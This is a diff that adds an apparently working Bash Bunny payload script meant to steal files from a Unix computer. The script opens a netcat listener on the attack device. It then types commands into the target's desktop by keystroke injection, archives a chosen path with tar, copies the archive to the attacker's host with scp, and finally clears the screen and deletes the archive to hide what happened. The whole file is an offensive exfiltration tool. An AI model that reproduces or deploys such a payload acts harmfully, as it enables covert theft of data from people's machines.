@@ -1,0 +1,64 @@
+#!/bin/bash
+###############################################################################
+# Title       : Extract from socket                                           #       
+# Author      : Abel Gancsos                                                  #
+# Version     : v. 1.0.0.0                                                    #
+# Target      : Unix                                                          #
+# Description : Extracts loot using a socket on the Bash Bunny.               #
+#-----------------------------------------------------------------------------#
+# Green  : Next stage                                                         #
+# Yellow : Waiting                                                            #
+# Blue   : Active                                                             #
+###############################################################################
+GET "HOST_IP"
+GET "SWITCH_POSITION"
+NAME=extract
+LOOT_PATH=/root/exdisk/loot/$SWITCH_POSITION/$NAME
+ISEXT=1
+if [ "$(ls /dev/mmcblk0p1 | wc -l)" == "0" ]; then
+    LOOT_PATH=/root/udisk/loot/$SWITCH_POSITION/$NAME
+    ISEXT=0
+fi
+SOURCE_PATH=
+SOCKET_PORT=33669
+RETAIN_EXDISK=1
+
+LED STARTUP
+ATTACKMODE ECM_ETHERNET HID
+
+## Stage 1: Mount exdisk
+LED STAGE1
+if [ "$ISEXT" == "1" ]; then
+    mount -t msdos -o rw /dev/mmcblk0p1 /root/exdisk
+fi
+if [ ! -d "$LOOT_PATH" ]; then
+    mkdir -p "$LOOT_PATH"
+fi
+rm -fr $LOOT_PATH/*
+LOG_PATH="$LOOT_PATH/$NAME.log"
+
+## Stage 2: Setup listening socket
+LED STAGE2
+nc -lp $SOCKET_PORT &
+
+## Stage 3: Invoke HID on target to start copy
+LED ATTACK
+if [ "$SOURCE_PATH" != "" ]; then
+    BASH_RUN "UNIX_DESKTOP" 5000 "tar -cf \"/tmp/$(basename ${SOURCE_PATH}).tar\" -C $(dirname \"$SOURCE_PATH\")\" $(basename ${SOURCE_PATH})"
+    CMD="scp -q \"/tmp/$(basename ${SOURCE_PATH}).tar\" anonymous@$HOST_IP:/tmp"
+    BASH_RUN "UNIX_DESKTOP" 5000 $CMD
+    mv "/tmp/$(basename ${SOURCE_PATH}).tar" "$LOOT_PATH"
+else
+    BUNNY_LOG $LOG_PATH "Source path is empty..."
+fi
+
+## Stage 4: Cleanup
+LED CLEANUP
+BASH_RUN "UNIX_DESKTOP" 500 "clear"
+BASH_RUN "UNIX_DESKTOP" 5000 "rm -fr \"/tmp/$(basename ${SOURCE_PATH}).tar\""
+if [ $RETAIN_EXDISK -eq 0 ]; then
+	umount /dev/mmcblk0p1
+fi
+
+LED FINISH
+LED B 20
